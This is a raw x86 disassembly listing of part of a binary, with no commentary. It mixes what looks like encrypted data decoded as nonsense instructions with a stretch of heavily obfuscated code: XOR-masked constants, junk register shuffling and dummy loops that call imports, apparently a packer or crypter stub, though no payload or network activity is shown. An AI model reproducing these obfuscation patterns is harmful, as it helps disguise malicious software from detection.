  40504b:	cs (bad) 
  40504d:	shl    ch,0xcc
  405050:	(bad)  
  405051:	pop    ecx
  405052:	jmp    0xc92b:0xaebfef30
  405059:	arpl   WORD PTR ds:0xfb877448,sp
  40505f:	lock cmp ebx,DWORD PTR [edi-0x6f1c62a7]
  405066:	ror    esp,cl
  405068:	inc    ecx
  405069:	(bad)  
  40506a:	sub    eax,0xe6348d7c
  40506f:	add    DWORD PTR [edx-0x4b],edx
  405072:	mov    ds:0xf3bcd59d,al
  405077:	xor    eax,0xc555c0e6
  40507c:	push   edi
  40507d:	jb     0x404fff
  40507f:	inc    esi
  405080:	xchg   ebx,eax
  405081:	mov    ch,0x39
  405083:	push   0x2c
  405085:	retf   0xc0c2
  405088:	cwde   
  405089:	pop    esp
  40508a:	sbb    BYTE PTR [esi+eiz*1-0x15],dl
  40508e:	and    dh,BYTE PTR [ecx-0x3]
  405091:	lock out 0xae,al
  405094:	push   es
  405095:	sar    BYTE PTR [ebp-0x43822eeb],0xe7
  40509c:	into   
  40509d:	sbb    DWORD PTR [esi],esi
  40509f:	inc    eax
  4050a0:	cmp    edi,DWORD PTR [eax+0x1d3dca55]
  4050a6:	pop    edx
  4050a7:	xor    eax,0xd42f6206
  4050ac:	nop
  4050ad:	inc    ebp
  4050ae:	mov    ah,ch
  4050b0:	adc    al,0x81
  4050b2:	fisttp QWORD PTR [ecx+0x1fabbab0]
  4050b8:	and    al,0xde
  4050ba:	jmp    eax
  4050bc:	stc    
  4050bd:	(bad)  
  4050be:	fucom  st(3)
  4050c0:	mov    ecx,0xe7342481
  4050c5:	dec    esp
  4050c6:	or     al,0x82
  4050c8:	enter  0x2c0b,0xdf
  4050cc:	jo     0x40510b
  4050ce:	push   ebx
  4050cf:	ins    DWORD PTR es:[edi],dx
  4050d0:	sub    DWORD PTR [ebp-0xeb59e21],edx
  4050d6:	clc    
  4050d7:	and    BYTE PTR [edi+0x11921034],0x1f
  4050de:	sbb    edi,DWORD PTR [edx]
  4050e0:	inc    esi
  4050e1:	pop    eax
  4050e2:	mov    edx,DWORD PTR [ecx-0x43f47b72]
  4050e8:	mov    BYTE PTR [edx],dh
  4050ea:	push   ecx
  4050eb:	das    
  4050ec:	je     0x40514b
  4050ee:	pushf  
  4050ef:	stos   DWORD PTR es:[edi],eax
  4050f0:	ret    0xceb4
  4050f3:	fild   DWORD PTR [ecx-0x24]
  4050f6:	js     0x405169
  4050f8:	mov    esi,0x8c1f3d67
  4050fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050fe:	xlat   BYTE PTR ds:[ebx]
  4050ff:	xor    dh,BYTE PTR [esp+eax*2+0x5e61c9ec]
  405106:	mov    ecx,ebp
  405108:	gs retf 
  40510a:	jbe    0x405116
  40510c:	xor    dh,BYTE PTR [ebx]
  40510e:	cmp    ebx,0xffffff80
  405111:	add    DWORD PTR [ebp-0x20a4f129],ebp
  405117:	adc    esi,DWORD PTR [ebp-0x2a]
  40511a:	mov    ecx,0x104b834a
  40511f:	cmp    ch,0xfb
  405122:	xchg   ebp,eax
  405123:	leave  
  405124:	add    DWORD PTR [eax+0x17],esi
  405127:	sub    al,BYTE PTR [edi+0x2f305c7e]
  40512d:	xor    BYTE PTR [eax-0x73],bl
  405130:	or     DWORD PTR [eax-0x691f5ae],eax
  405136:	std    
  405137:	cmp    BYTE PTR [esi-0x70e56caf],cl
  40513d:	add    DWORD PTR [ebx+0x3242da63],esi
  405143:	rcl    ebx,cl
  405145:	fcomp  DWORD PTR [edi-0x30]
  405148:	jbe    0x4051a7
  40514a:	push   esi
  40514b:	ret    0xbe01
  40514e:	pop    ebx
  40514f:	mov    ebx,0x8868a28d
  405155:	lahf   
  405156:	jae    0x405169
  405158:	rcr    DWORD PTR [ebp-0x34],0x43
  40515c:	inc    edi
  40515d:	ror    BYTE PTR [ecx*4-0x17f7abd6],1
  405164:	mov    ecx,0x6bf64c31
  405169:	mov    bh,0x5c
  40516b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40516c:	jp     0x405179
  40516e:	jecxz  0x4051a5
  405170:	sbb    cl,BYTE PTR [ebp+0x1d]
  405173:	stos   DWORD PTR es:[edi],eax
  405174:	loopne 0x405149
  405176:	jb     0x405140
  405178:	retf   
  405179:	int    0x8f
  40517b:	sub    eax,0x848e19e2
  405180:	cdq    
  405181:	nop
  405182:	jo     0x405130
  405184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405185:	test   eax,0xb4613916
  40518a:	loope  0x40513e
  40518c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40518d:	add    al,BYTE PTR [ebp+0x42]
  405190:	iret   
  405191:	bound  ecx,QWORD PTR [ecx]
  405193:	ret    
  405194:	push   cs
  405195:	pop    edi
  405196:	scas   eax,DWORD PTR es:[edi]
  405197:	aad    0x6b
  405199:	popf   
  40519a:	xchg   BYTE PTR [esp+esi*8],dl
  40519d:	push   cs
  40519e:	ins    DWORD PTR es:[edi],dx
  40519f:	pop    ecx
  4051a0:	aas    
  4051a1:	ret    
  4051a2:	mov    esi,0x69a66b3c
  4051a7:	adc    esi,ecx
  4051a9:	repnz fld DWORD PTR [ecx+ebp*1-0xfe7a932]
  4051b1:	lock int 0x94
  4051b4:	or     eax,0x8f10c3b3
  4051b9:	add    al,0x64
  4051bb:	push   eax
  4051bc:	inc    ebx
  4051bd:	jp     0x405170
  4051bf:	xchg   DWORD PTR [esi+0x3bf71643],eax
  4051c5:	jle    0x4051d7
  4051c7:	js     0x405180
  4051c9:	scas   eax,DWORD PTR es:[edi]
  4051ca:	mov    edi,fs
  4051cc:	into   
  4051cd:	mov    esp,0x1eda5434
  4051d2:	mov    al,ds:0x5ade1feb
  4051d7:	mov    al,ds:0x96624169
  4051dc:	pop    ss
  4051dd:	cmp    bl,al
  4051df:	dec    ecx
  4051e0:	neg    DWORD PTR [esi+0x584eea0c]
  4051e6:	push   edx
  4051e7:	es push esi
  4051e9:	sub    al,0x1e
  4051eb:	outs   dx,DWORD PTR ds:[esi]
  4051ec:	mov    ebx,0x45debfe2
  4051f1:	inc    DWORD PTR [ecx+0xbf17a38]
  4051f7:	ret    0xf0a5
  4051fa:	outs   dx,BYTE PTR ds:[esi]
  4051fb:	into   
  4051fc:	inc    ebx
  4051fd:	xor    DWORD PTR [edx+esi*1+0x14],eax
  405201:	xor    eax,0x7ad5cf71
  405206:	cmp    esp,DWORD PTR [edx]
  405208:	test   al,0xa5
  40520a:	enter  0xe912,0x9a
  40520e:	aam    0xa
  405210:	jge    0x4051a4
  405212:	sbb    eax,0x2877c108
  405217:	je     0x405250
  405219:	ds out dx,eax
  40521b:	stc    
  40521c:	and    ch,0xc6
  40521f:	xor    dh,BYTE PTR [ebx+0x5c33383]
  405225:	fdiv   QWORD PTR [edx+0x32]
  405228:	add    cl,ch
  40522a:	add    DWORD PTR fs:[eax],eax
  40522d:	add    BYTE PTR [ebx+0x4d03c84d],cl
  405233:	or     BYTE PTR [ecx+0x4d8bf04d],cl
  405239:	in     al,0x85
  40523b:	leave  
  40523c:	je     0x40531d
  405242:	mov    DWORD PTR [ebp-0x20],0x0
  405249:	push   0x3
  40524b:	xor    edx,edx
  40524d:	pop    edx
  40524e:	add    edx,0x8
  405251:	push   edx
  405252:	pop    ecx
  405253:	push   0x6
  405255:	dec    ecx
  405256:	pop    ebx
  405257:	dec    ebx
  405258:	xchg   ebx,ecx
  40525a:	sub    ebx,ecx
  40525c:	xchg   ebx,ecx
  40525e:	dec    ecx
  40525f:	mov    eax,DWORD PTR [ebp-0x1c]
  405262:	imul   eax,ecx
  405265:	sub    esp,eax
  405267:	mov    DWORD PTR [ebp-0x20],esp
  40526a:	mov    eax,DWORD PTR [ebp-0x4]
  40526d:	mov    ecx,0x7510894
  405272:	xor    eax,ecx
  405274:	mov    edx,0x3272dc
  405279:	add    eax,edx
  40527b:	mov    DWORD PTR [ebp+0x8],eax
  40527e:	mov    eax,DWORD PTR [ebp-0x14]
  405281:	xor    eax,ecx
  405283:	add    eax,edx
  405285:	mov    edx,DWORD PTR [ebp+0x14]
  405288:	imul   eax,DWORD PTR [edx]
  40528b:	mov    edx,DWORD PTR [ebp-0x4]
  40528e:	xor    edx,ecx
  405290:	mov    ecx,DWORD PTR [ebp+0x8]
  405293:	lea    ecx,[edx+ecx*1+0x3272dc]
  40529a:	cmp    ecx,eax
  40529c:	je     0x405313
  4052a2:	mov    edi,DWORD PTR [ebp-0x14]
  4052a5:	mov    eax,DWORD PTR [ebp+0x8]
  4052a8:	mov    edx,DWORD PTR [ebp+0x14]
  4052ab:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4052af:	mov    ecx,0x7510894
  4052b4:	xor    edx,edx
  4052b6:	xor    edi,ecx
  4052b8:	mov    esi,0x3272dc
  4052bd:	add    edi,esi
  4052bf:	div    edi
  4052c1:	mov    edx,DWORD PTR [ebp-0x4]
  4052c4:	xor    edx,ecx
  4052c6:	lea    eax,[edx+eax*1+0x3272dc]
  4052cd:	mov    edx,DWORD PTR [ebp+0x8]
  4052d0:	mov    edi,DWORD PTR [ebp-0x20]
  4052d3:	mov    DWORD PTR [edi+edx*4],eax
  4052d6:	mov    eax,DWORD PTR [ebp-0x14]
  4052d9:	mov    edx,DWORD PTR [ebp+0x8]
  4052dc:	xor    eax,ecx
  4052de:	lea    eax,[eax+edx*1+0x3272dc]
  4052e5:	mov    DWORD PTR [ebp+0x8],eax
  4052e8:	mov    eax,DWORD PTR [ebp-0x14]
  4052eb:	mov    edx,DWORD PTR [ebp+0x14]
  4052ee:	xor    eax,ecx
  4052f0:	add    eax,esi
  4052f2:	imul   eax,DWORD PTR [edx]
  4052f5:	mov    edx,DWORD PTR [ebp-0x4]
  4052f8:	xor    edx,ecx
  4052fa:	mov    ecx,DWORD PTR [ebp+0x8]
  4052fd:	lea    ecx,[edx+ecx*1+0x3272dc]
  405304:	cmp    ecx,eax
  405306:	jne    0x4052a2
  40530c:	mov    eax,esi
  40530e:	jmp    0x405318
  405313:	mov    eax,0x3272dc
  405318:	mov    ebx,0x7510894
  40531d:	mov    ecx,DWORD PTR [ebp-0x4]
  405320:	xor    ecx,ebx
  405322:	add    ecx,eax
  405324:	mov    DWORD PTR [ebp-0xc],ecx
  405327:	mov    ebx,0x65655
  40532c:	add    ebx,0x3234
  405332:	xchg   ebx,esi
  405334:	xor    ebx,ebx
  405336:	push   esi
  405337:	mov    esi,ebx
  405339:	pop    ebx
  40533a:	mov    edx,esi
  40533c:	add    ebx,0x1002
  405342:	lea    eax,[ebp-0x10]
  405345:	add    edx,eax
  405347:	add    edx,0x5
  40534a:	push   edx
  40534b:	inc    esi
  40534c:	pop    ecx
  40534d:	dec    ecx
  40534e:	xchg   ecx,eax
  40534f:	dec    eax
  405350:	xchg   ecx,eax
  405351:	dec    ecx
  405352:	xchg   ecx,edx
  405354:	dec    edx
  405355:	push   edx
  405356:	mov    edx,ebx
  405358:	pop    ebx
  405359:	dec    ebx
  40535a:	call   DWORD PTR [ebx]
  40535c:	cmp    DWORD PTR [ebp+0x10],esi
  40535f:	je     0x40537e
  405365:	xchg   edx,eax
  405366:	push   0xb
  405368:	pop    ecx
  405369:	push   0x4
  40536b:	pop    ebx
  40536c:	inc    ebx
  40536d:	xchg   ebx,ecx
  40536f:	sub    ebx,ecx
  405371:	xchg   ebx,ecx
  405373:	dec    ecx
  405374:	dec    ecx
  405375:	mov    eax,DWORD PTR [ebp-0x1c]
  405378:	imul   eax,ecx
  40537b:	add    esp,eax
  40537d:	xchg   edx,eax
  40537e:	push   eax
  40537f:	xor    ebx,ebx
  405381:	mov    edx,esp
  405383:	dec    edx
  405384:	inc    ebx
  405385:	add    ebx,DWORD PTR [edx+ebx*1]
  405388:	dec    ebx
  405389:	xor    edx,edx
  40538b:	add    DWORD PTR [ebp-0xc],ebx
  40538e:	pop    ebx
  40538f:	mov    eax,DWORD PTR [ebp-0xc]
  405392:	pop    edi
  405393:	pop    esi
  405394:	pop    ebx
  405395:	leave  
  405396:	ret    0x10
  405399:	push   ebp
  40539a:	mov    ebp,esp
  40539c:	sub    esp,0x18
  40539f:	and    DWORD PTR ds:0x413c1e,0x0
  4053a9:	mov    ecx,DWORD PTR ds:0x413c1e
  4053af:	inc    ecx
  4053b0:	mov    DWORD PTR ds:0x413c1e,ecx
  4053b6:	cmp    DWORD PTR ds:0x413c1e,0x8
  4053bd:	jne    0x4053d7
  4053c3:	push   DWORD PTR [ebp-0x20]
  4053c6:	push   0x413cf0
  4053cb:	push   DWORD PTR [ebp-0x24]
  4053ce:	push   DWORD PTR [ebp-0x14]
  4053d1:	call   DWORD PTR ds:0x416770
  4053d7:	cmp    DWORD PTR ds:0x413c1e,0x7
  4053de:	jne    0x4053f3
  4053e4:	xor    ecx,ecx
  4053e6:	or     ecx,DWORD PTR ds:0x413c1e
  4053ec:	inc    ecx
  4053ed:	mov    DWORD PTR ds:0x413c1e,ecx
  4053f3:	cmp    DWORD PTR ds:0x413c1e,0x1f
  4053fa:	jb     0x4053a9
  405400:	and    DWORD PTR ds:0x413c12,ecx
  405406:	mov    DWORD PTR [ebp-0x10],0xf89f85b0
  40540d:	xor    edx,edx
  40540f:	or     edx,DWORD PTR ds:0x413cc0
  405415:	mov    edx,DWORD PTR [edx]
  405417:	and    DWORD PTR ds:0x413ce8,edx
  40541d:	lea    eax,[ebp+0x14]
  405420:	mov    DWORD PTR [ebp-0x4],eax
  405423:	push   esi
  405424:	adc    edx,ecx
  405426:	mov    esi,0xf89c85b0
  40542b:	mov    DWORD PTR [ebp-0xc],esi
  40542e:	and    DWORD PTR ds:0x413c74,0x0
  405438:	jmp    0x40544a
  40543d:	mov    edx,DWORD PTR ds:0x413c74
  405443:	inc    edx
  405444:	mov    DWORD PTR ds:0x413c74,edx
  40544a:	cmp    DWORD PTR ds:0x413c74,0x1a
  405451:	jae    0x405550
  405457:	cmp    DWORD PTR ds:0x413c74,0x10
  40545e:	jne    0x40547c
  405464:	push   0x41401c
  405469:	push   DWORD PTR [ebp-0x14]
  40546c:	push   0x416140
  405471:	push   0x4161b2
  405476:	call   DWORD PTR ds:0x416774
  40547c:	cmp    DWORD PTR ds:0x413c74,0xf
  405483:	jne    0x405498
  405489:	xor    edx,edx
  40548b:	add    edx,DWORD PTR ds:0x413c74
  405491:	inc    edx
  405492:	mov    DWORD PTR ds:0x413c74,edx
  405498:	jmp    0x40543d
  40549d:	and    DWORD PTR ds:0x413c0e,0x0
  4054a7:	jmp    0x4054b9
  4054ac:	mov    ecx,DWORD PTR ds:0x413c0e
  4054b2:	inc    ecx
  4054b3:	mov    DWORD PTR ds:0x413c0e,ecx
  4054b9:	cmp    DWORD PTR ds:0x413c0e,0x16
  4054c0:	jae    0x405550
  4054c6:	cmp    DWORD PTR ds:0x413c0e,0x7
  4054cd:	jne    0x4054e8
  4054d3:	push   0x1925
  4054d8:	push   0x413c1a
  4054dd:	push   0x416140
  4054e2:	call   DWORD PTR ds:0x416778
  4054e8:	cmp    DWORD PTR ds:0x413c0e,0x6
  4054ef:	jne    0x405504
  4054f5:	xor    ecx,ecx
  4054f7:	or     ecx,DWORD PTR ds:0x413c0e
  4054fd:	inc    ecx
  4054fe:	mov    DWORD PTR ds:0x413c0e,ecx
  405504:	jmp    0x4054ac
  405509:	mov    DWORD PTR ds:0x413d1c,0x15
  405513:	cmp    DWORD PTR ds:0x413d1c,0x0
  40551a:	je     0x405550
  405520:	cmp    DWORD PTR ds:0x413d1c,0x21
  405527:	jne    0x405538
  40552d:	push   0x416025
  405532:	call   DWORD PTR ds:0x41677c
  405538:	mov    ecx,DWORD PTR ds:0x413d1c
  40553e:	dec    ecx
  40553f:	mov    DWORD PTR ds:0x413d1c,ecx
  405545:	jmp    0x405513
  40554a:	adc    edx,0x7769
  405550:	lea    eax,[ebp-0xc]
  405553:	mov    DWORD PTR [ebp-0x14],eax
  405556:	or     eax,DWORD PTR ds:0x413c0a
  40555c:	mov    eax,DWORD PTR [ebp-0xc]
  40555f:	and    edx,edx
  405561:	mov    edx,DWORD PTR [ebp-0x14]
  405564:	mov    ecx,0x7510894
  405569:	xor    eax,ecx
  40556b:	add    eax,0x3272dc
  405570:	mov    DWORD PTR [edx],eax
  405572:	and    DWORD PTR ds:0x413d34,0x0
  40557c:	jmp    0x40558c
  405581:	mov    eax,ds:0x413d34
  405586:	inc    eax
  405587:	mov    ds:0x413d34,eax
  40558c:	cmp    DWORD PTR ds:0x413d34,0x17
  405593:	jae    0x4055dc
  405599:	cmp    DWORD PTR ds:0x413d34,0x8
  4055a0:	jne    0x4055b9
  4055a6:	push   0x413cec
  4055ab:	push   DWORD PTR [ebp-0x24]
  4055ae:	push   0x416049
  4055b3:	call   DWORD PTR ds:0x416780
  4055b9:	cmp    DWORD PTR ds:0x413d34,0x7
  4055c0:	jne    0x4055d1
  4055c6:	mov    eax,ds:0x413d34
  4055cb:	inc    eax
  4055cc:	mov    ds:0x413d34,eax
  4055d1:	jmp    0x405581
  4055d6:	and    edx,DWORD PTR ds:0x413bfe
  4055dc:	mov    eax,ds:0x41622c
  4055e1:	mov    edx,DWORD PTR [ebp-0x4]
  4055e4:	add    DWORD PTR ds:0x413bf6,0x4ad3
  4055ee:	mov    eax,DWORD PTR [eax]
  4055f0:	add    eax,DWORD PTR [edx]
  4055f2:	sbb    DWORD PTR ds:0x413c80,0x777b
  4055fc:	push   edi
  4055fd:	xor    DWORD PTR ds:0x413c06,ebx
  405603:	mov    DWORD PTR [ebp-0x8],eax
  405606:	mov    edi,DWORD PTR [ebp+0x8]
  405609:	movzx  eax,BYTE PTR ds:0x413d28
  405610:	sub    DWORD PTR ds:0x413c06,eax
  405616:	mov    eax,ds:0x4163b4
  40561b:	mov    eax,DWORD PTR [eax+0x198]
  405621:	adc    edx,DWORD PTR ds:0x414010
  405627:	xor    edi,ecx
  405629:	mov    edx,0x3272dc
  40562e:	add    DWORD PTR ds:0x413c1a,0x413cd8
  405638:	add    edi,edx
  40563a:	mov    DWORD PTR ds:0x413d28,0x4988
  405644:	cmp    DWORD PTR [eax],edi
  405646:	je     0x40565d
  40564c:	mov    eax,DWORD PTR [eax]
  40564e:	mov    DWORD PTR ds:0x413ce4,0xf81
  405658:	jmp    0x407c4a
  40565d:	mov    eax,DWORD PTR [ebp+0x18]
  405660:	mov    DWORD PTR ds:0x413c06,0x7bbf
  40566a:	cmp    eax,esi
  40566c:	mov    DWORD PTR ds:0x413d30,0x2bf7
  405676:	jne    0x405686
  40567c:	push   0xf89c85b1
  405681:	jmp    0x407c39
  405686:	mov    esi,DWORD PTR [ebp+0x18]
  405689:	movzx  eax,WORD PTR ds:0x413cf0
  405690:	mov    eax,0xf89c85b2
  405695:	cmp    esi,eax
  405697:	jne    0x407c29
  40569d:	mov    eax,DWORD PTR [ebp+0x10]
  4056a0:	inc    DWORD PTR ds:0x413c80
  4056a6:	xor    eax,ecx
  4056a8:	add    eax,edx
  4056aa:	mov    DWORD PTR [ebp-0x18],eax
  4056ad:	adc    DWORD PTR ds:0x413d1c,0x3347
  4056b7:	mov    eax,DWORD PTR [ebp+0xc]
  4056ba:	mov    esi,DWORD PTR [ebp-0x8]
  4056bd:	xor    eax,ecx
  4056bf:	sbb    DWORD PTR ds:0x413ce4,0x413c70
  4056c9:	add    eax,edx
  4056cb:	imul   eax,DWORD PTR [esi]
  4056ce:	and    DWORD PTR ds:0x413c0a,ebx
  4056d4:	mov    esi,DWORD PTR [ebp+0x8]
  4056d7:	and    DWORD PTR ds:0x413d24,0x413c02
  4056e1:	xor    esi,ecx
  4056e3:	add    esi,edx
  4056e5:	cmp    esi,eax
  4056e7:	movzx  eax,BYTE PTR ds:0x413cf0
  4056ee:	mov    eax,DWORD PTR [ebp-0x4]
  4056f1:	push   ebx
  4056f2:	mov    DWORD PTR ds:0x414000,0x6197
  4056fc:	je     0x40577e
  405702:	and    DWORD PTR ds:0x413c1e,0x0
  40570c:	jmp    0x40571e
  405711:	mov    esi,DWORD PTR ds:0x413c1e
  405717:	inc    esi
  405718:	mov    DWORD PTR ds:0x413c1e,esi
  40571e:	cmp    DWORD PTR ds:0x413c1e,0x14
  405725:	jae    0x405765
  40572b:	cmp    DWORD PTR ds:0x413c1e,0xa
  405732:	jne    0x405746
  405738:	push   0x413d1c
  40573d:	push   DWORD PTR [ebp-0x24]
  405740:	call   DWORD PTR ds:0x416784
  405746:	cmp    DWORD PTR ds:0x413c1e,0x9
  40574d:	jne    0x405760
  405753:	mov    esi,DWORD PTR ds:0x413c1e
  405759:	inc    esi
  40575a:	mov    DWORD PTR ds:0x413c1e,esi
  405760:	jmp    0x405711
  405765:	mov    esi,DWORD PTR [ebp-0x18]
  405768:	add    DWORD PTR [eax],esi
  40576a:	mov    eax,DWORD PTR [ebp-0x4]
  40576d:	mov    esi,DWORD PTR [ebp+0xc]
  405770:	xor    esi,ecx
  405772:	add    esi,edx
  405774:	imul   esi,DWORD PTR [eax]
  405777:	mov    DWORD PTR [eax],esi
  405779:	jmp    0x405783
  40577e:	mov    esi,DWORD PTR [ebp+0x14]
  405781:	xor    DWORD PTR [eax],esi
  405783:	mov    eax,DWORD PTR [ebp-0x4]
  405786:	mov    edi,DWORD PTR [ebp+0x10]
  405789:	xor    edi,ecx
  40578b:	mov    esi,0xffcd8d24
  405790:	mov    ebx,esi
  405792:	sub    ebx,edi
  405794:	add    DWORD PTR [eax],ebx
  405796:	mov    eax,DWORD PTR [ebp-0x4]
  405799:	mov    edi,DWORD PTR [ebp-0x8]
  40579c:	add    edi,DWORD PTR [eax]
  40579e:	mov    DWORD PTR [ebp-0x8],edi
  4057a1:	mov    eax,DWORD PTR [ebp+0xc]
  4057a4:	mov    edi,DWORD PTR [ebp+0xc]
  4057a7:	xor    edi,ecx
  4057a9:	xor    eax,ecx
  4057ab:	lea    eax,[eax+edi*1+0x64e5b8]
  4057b2:	mov    edi,DWORD PTR [ebp+0xc]
  4057b5:	xor    edi,ecx
  4057b7:	add    edi,edx
  4057b9:	imul   eax,edi
  4057bc:	mov    edi,DWORD PTR [ebp+0xc]
  4057bf:	xor    edi,ecx
  4057c1:	sub    edi,eax
  4057c3:	mov    eax,DWORD PTR [ebp-0x4]
  4057c6:	add    edi,edx
  4057c8:	cmp    DWORD PTR [eax],edi
  4057ca:	mov    eax,DWORD PTR [ebp-0x4]
  4057cd:	mov    edi,DWORD PTR [ebp+0x10]
  4057d0:	jg     0x4057e3
  4057d6:	xor    edi,ecx
  4057d8:	mov    ebx,esi
  4057da:	sub    ebx,edi
  4057dc:	add    DWORD PTR [eax],ebx
  4057de:	jmp    0x4057e9
  4057e3:	xor    edi,ecx
  4057e5:	add    edi,edx
  4057e7:	add    DWORD PTR [eax],edi
  4057e9:	mov    eax,DWORD PTR [ebp-0x8]
  4057ec:	mov    edi,DWORD PTR [ebp-0x10]
  4057ef:	mov    eax,DWORD PTR [eax]
  4057f1:	jmp    0x407b3d
  4057f6:	imul   ebp,DWORD PTR [edx+0x66],0xaba967a5
  4057fd:	stos   BYTE PTR es:[edi],al
  4057fe:	(bad)  
  4057ff:	sbb    eax,0x4e9094ee
  405804:	jmp    0x4b7c:0x7c5fe0c8
  40580b:	pop    edi
  40580c:	jl     0x40588a
  40580e:	test   BYTE PTR [ebp+eax*1-0x694e6a6b],ah
  405815:	add    DWORD PTR [eax*8-0x4e52828c],eax
  40581c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40581d:	xor    DWORD PTR [ebp-0x5d],ebx
  405820:	push   esp
  405821:	popf   
  405822:	dec    edi
  405823:	push   es
  405824:	cld    
  405825:	fs inc edi
  405827:	jo     0x405834
  405829:	inc    ecx
  40582a:	sub    DWORD PTR [ebp-0x44],esp
  40582d:	hlt    
  40582e:	in     eax,0x76
  405830:	push   esp
  405831:	aad    0xdb
  405833:	or     DWORD PTR [edx-0x17ae1778],eax
  405839:	push   ds
  40583a:	mov    ds:0x46eaaf99,eax
  40583f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405840:	jge    0x4057fc
  405842:	sar    DWORD PTR [ebx+0x73],0xb8
  405846:	pop    ds
  405847:	stos   BYTE PTR es:[edi],al
  405848:	dec    eax
  405849:	sub    eax,0x19d5ee89
  40584e:	mov    cl,0xd2
  405850:	mov    esi,0xae1d426b
  405855:	and    eax,0xbfad728b
  40585a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40585b:	call   0xf2a5:0x2d07f428
  405862:	gs push 0xffffffb1
  405865:	das    
  405866:	push   esi
  405867:	push   esi
  405868:	aad    0x6d
  40586a:	nop
  40586b:	adc    bl,BYTE PTR [edi]
  40586d:	retf   0x57d5
  405870:	ja     0x405824
  405872:	dec    ecx
  405873:	(bad)  
  405874:	stc    
  405875:	mov    edi,0xd8a6ba78
  40587a:	cs iret 
  40587c:	sbb    dl,dl
  40587e:	retf   0x5148
  405881:	xor    esp,ebx
  405883:	pop    eax
  405884:	inc    edi
  405885:	pusha  
  405886:	sbb    eax,0x9ac97c4f
  40588b:	pop    eax
  40588c:	(bad)  
  40588d:	mov    dl,0x84
  40588f:	in     al,dx
  405890:	not    DWORD PTR [ebx+0x429d7311]
  405896:	xor    DWORD PTR ds:0x566078cc,0x8b602ccc
  4058a0:	sub    al,0x99
  4058a2:	fistp  DWORD PTR [ecx]
  4058a4:	ds data16 and al,0x62
  4058a8:	add    bl,ah
  4058aa:	test   eax,0x1a0a00f3
  4058af:	icebp  
  4058b0:	test   eax,0x7e511369
  4058b5:	pop    esp
  4058b6:	add    ebx,DWORD PTR [ecx+0x53014fd1]
  4058bc:	add    DWORD PTR [edi+0x54],esi
  4058bf:	loop   0x4058d1
  4058c1:	out    0x79,eax
  4058c3:	jmp    0x23e4cc3c
  4058c8:	add    eax,0xd059f801
  4058cd:	jb     0x4058f6
  4058cf:	mov    ds:0x59e63d77,al
  4058d4:	adc    cl,BYTE PTR [ecx-0xf7c70ae]
  4058da:	dec    BYTE PTR [edi]
  4058dc:	mov    edx,0x12cc31d0
  4058e1:	xor    al,0x38
  4058e3:	cmp    eax,0x45b521d3
  4058e8:	(bad)  
  4058e9:	shl    BYTE PTR [ebx+ebp*2+0x10b198e2],cl
  4058f0:	data16 clc 
  4058f2:	sbb    DWORD PTR [edi],0xffffffc7
  4058f5:	jb     0x40588e
  4058f7:	mov    bl,0xaa
  4058f9:	and    BYTE PTR [ebp-0x78],dh
  4058fc:	cld    
  4058fd:	and    eax,0x9f39937a
  405902:	test   al,0x88
  405904:	or     eax,0x69c562a3
  405909:	add    eax,0x92f47759
  40590e:	sbb    al,cl
  405910:	sub    eax,0xb6671612
  405915:	add    al,0x45
  405917:	adc    al,0x24
  405919:	mov    ah,0xeb
  40591b:	cmp    al,0xe8
  40591d:	cs jnp 0x405956
  405920:	xchg   esi,eax
  405921:	add    BYTE PTR [ebx+0x1ed59d69],0x65
  405928:	dec    esp
  405929:	fild   QWORD PTR fs:[edx]
  40592c:	fsubp  st(1),st
  40592e:	add    edi,DWORD PTR [esp+eax*4-0x2f]
  405932:	in     al,0xb
  405934:	xor    BYTE PTR [edx+0x783d47f9],0x6e
  40593b:	mov    al,BYTE PTR [ebx]
  40593d:	into   
  40593e:	sub    BYTE PTR [ebx-0x4d16eab6],dh
  405944:	push   ebx
  405945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405946:	adc    eax,0xbfc2418c
  40594b:	mov    cl,0xa7
  40594d:	loope  0x40599a
  40594f:	add    dh,ch
  405951:	pop    edi
  405952:	stos   BYTE PTR es:[edi],al
  405953:	adc    ebx,DWORD PTR [edx-0x7c]
  405956:	mov    eax,ds:0x4b935e4d
  40595b:	repnz xchg ecx,eax
  40595d:	add    BYTE PTR [ecx-0x5c572b3b],dh
  405963:	jl     0x405948
  405965:	lock jmp 0xd315:0xc2b85624
  40596d:	jae    0x405928
  40596f:	pop    ecx
  405970:	fld    TBYTE PTR [eax-0x75]
  405973:	inc    ebx
  405974:	loopne 0x405967
  405976:	or     al,BYTE PTR [edi]
  405978:	push   cs
  405979:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40597a:	shl    BYTE PTR [edx+0x5f1ed81],cl
  405980:	bound  esi,QWORD PTR [ecx-0x61]
  405983:	sti    
  405984:	into   
  405985:	(bad)  
  405987:	or     BYTE PTR [edi],bl
  405989:	retf   0x2610
  40598c:	jmp    0xfe375220
  405991:	sbb    al,0xcc
  405993:	mov    edx,0x9930a70b
  405998:	or     al,bh
  40599a:	stos   BYTE PTR es:[edi],al
  40599b:	push   ecx
  40599c:	inc    ebp
  40599d:	clc    
  40599e:	pushf  
  40599f:	lds    ecx,FWORD PTR [ecx+eiz*4+0x68]
  4059a3:	fidivr DWORD PTR [edx-0x45c94a53]
  4059a9:	push   esp
  4059aa:	inc    ebp
  4059ab:	loope  0x40596d
  4059ad:	mov    ebp,0xbf73d9df
  4059b2:	pop    ds
  4059b3:	inc    ebx
  4059b4:	in     eax,dx
  4059b5:	mov    ah,0xeb
  4059b7:	fnstcw WORD PTR [eax+0x52]
  4059ba:	jl     0x40597f
  4059bc:	fdiv   DWORD PTR [ecx-0x78]
  4059bf:	or     al,0x92
  4059c1:	push   es
  4059c2:	loop   0x405989
  4059c4:	mov    esi,0x6b491e73
  4059c9:	xchg   ebp,eax
  4059ca:	xchg   edx,eax
  4059cb:	sbb    ch,bl
  4059cd:	pushf  
  4059ce:	dec    esi
  4059cf:	lds    esi,FWORD PTR [esi]
  4059d1:	mov    ah,0x64
  4059d3:	mov    edi,0x7de70a15
  4059d8:	cmp    ebp,DWORD PTR [edx+edx*1]
  4059db:	xor    edx,DWORD PTR [esi]
  4059dd:	push   ecx
